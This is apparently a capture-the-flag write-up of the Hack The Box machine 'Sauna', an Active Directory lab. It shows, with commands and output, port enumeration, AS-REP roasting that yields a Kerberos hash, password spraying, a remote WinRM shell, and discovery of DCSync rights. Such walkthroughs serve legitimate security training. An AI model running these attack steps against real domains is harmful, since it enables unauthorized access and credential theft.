---
layout: default
---

# Sauna 

# Enumeration

IP → 10.10.10.175

Port scan reported the following opened ports.

```bash
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49668/tcp open  unknown          syn-ack
49673/tcp open  unknown          syn-ack
49674/tcp open  unknown          syn-ack
49677/tcp open  unknown          syn-ack
49689/tcp open  unknown          syn-ack
49697/tcp open  unknown          syn-ack
```

### Port 53

- DNS

```bash
┌──(kali㉿kali)-[~]
└─$ dig ANY EGOTISTICAL-BANK.LOCAL @10.10.10.175

; <<>> DiG 9.18.16-1-Debian <<>> ANY EGOTISTICAL-BANK.LOCAL @10.10.10.175
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 25812
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;EGOTISTICAL-BANK.LOCAL.                IN      ANY

;; ANSWER SECTION:
EGOTISTICAL-BANK.LOCAL. 600     IN      A       10.10.10.175
EGOTISTICAL-BANK.LOCAL. 3600    IN      NS      sauna.EGOTISTICAL-BANK.LOCAL.
EGOTISTICAL-BANK.LOCAL. 3600    IN      SOA     sauna.EGOTISTICAL-BANK.LOCAL. hostmaster.EGOTISTICAL-BANK.LOCAL. 48 900 600 86400 3600
EGOTISTICAL-BANK.LOCAL. 600     IN      AAAA    dead:beef::d82a:5af8:762a:f639

;; ADDITIONAL SECTION:
sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN   A       10.10.10.175
sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN   AAAA    dead:beef::656c:5335:5c58:6664
sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN   AAAA    dead:beef::bf

;; Query time: 47 msec
;; SERVER: 10.10.10.175#53(10.10.10.175) (TCP)
;; WHEN: Mon Nov 13 20:17:30 CET 2023
;; MSG SIZE  rcvd: 234
```

### Port 445/139

- SMB
- Need credentials

```bash
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.10.10.175 -u '%' -p '%' --shares
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\%:% STATUS_LOGON_FAILURE 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\10.10.10.175\\ -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

### Port 139

- RPC
- Need credentials

```bash
┌──(kali㉿kali)-[~]
└─$ rpcclient -U '%' 10.10.10.175
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

### Port 389

- LDAP
- We can connect but the full tree isn’t represented

From the port 80 we can obtain  series of names and creating a wordlist with common names in companies we obtain two valid usernames

- `fsmith` → obtain from the web page
- `hsmith` → obtain from LDAP

We can perform an ASP-ROAST attack.

# Foothold

```bash
┌──(kali㉿kali)-[~/machines/windows/sauna]
└─$ impacket-GetNPUsers -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:e93df6639cb3c7676b14a3ba635cead0$44a36d01b75e751ffa3b6ada9cf3c0fb7b0cc4aeb28af36874587ee86dbe54f4a819d96fb3b63376cb2e342fe40555374a4e9e60e20b204b6cc740d36b23327e2f76e4ec4f0ab46faa9c1d972f2ca56b7e92220228cac9da1b6f399c40f086839e91016344ba7f33d3d0ccea758d07e116a01e9940f3cf0e73c7f427b92c483a027fa73de416061d2480d5ac8285a62a597693dc9debdeab84af4e030581ea474d00f7c3d443db9b0ef1e6b2c832e9fdedef1426b42f7942db203634494c5d62e63cfa52d203921d48636cc01a4f1bd7adfae6e68c8ecc0de508ec96a791397549986002121785cabd701647eecfb264e9d9819b8d5cc60ac55bd51d2e884ab7
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
```

Cracking this hash we obtain the password we obtain a set of credentials `fsmtih:Thestrokes23`.

Whis credentials are valid for both users.

```bash
┌──(kali㉿kali)-[~/machines/windows/sauna]
└─$ crackmapexec smb 10.10.10.175 -u users.txt -p password.txt --continue-on-success
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\hsmith:Thestrokes23
```

If we user ldapdomaindump to dump all the domain from LDAP, we can see that the user fsmith can connect remotely to the machine, and that there is another user.

![Untitled](Sauna%20(DCSync%20right%20over%20domain)%202f3852c85f1a447f890904e704db521d/Untitled.png)

We connect to the machine

```bash
┌──(kali㉿kali)-[~/machines/windows/sauna]
└─$ evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'                        
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents>
```

Basic enumeration didn’t show anything so launching winPEAS we can obtain the credentials for the user **svc_loanmgr.**

```bash
┌──(kali㉿kali)-[~/machines/windows/sauna]
└─$ crackmapexec smb 10.10.10.175 -u users.txt -p password.txt --continue-on-success 
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\fsmith:Moneymakestheworldgoround! STATUS_LOGON_FAILURE 
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\hsmith:Thestrokes23 
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\hsmith:Moneymakestheworldgoround! STATUS_LOGON_FAILURE 
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\administrator:Thestrokes23 STATUS_LOGON_FAILURE 
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\administrator:Moneymakestheworldgoround! STATUS_LOGON_FAILURE 
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Thestrokes23 STATUS_LOGON_FAILURE 
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! 
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\:Thestrokes23 STATUS_LOGON_FAILURE 
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\:Moneymakestheworldgoround! STATUS_LOGON_FAILURE
```

Now we will conect as him to the machine and see how to elevate out privileges.

# Privilege escalation

This new user doesnt seem to have any new privilege over the DC in the LOCAL perspective, let’s see what about in the DOMAIN perspective.

He has DCSync rights over the domain, so we can use secretsdump to get the administrator NTLM hash.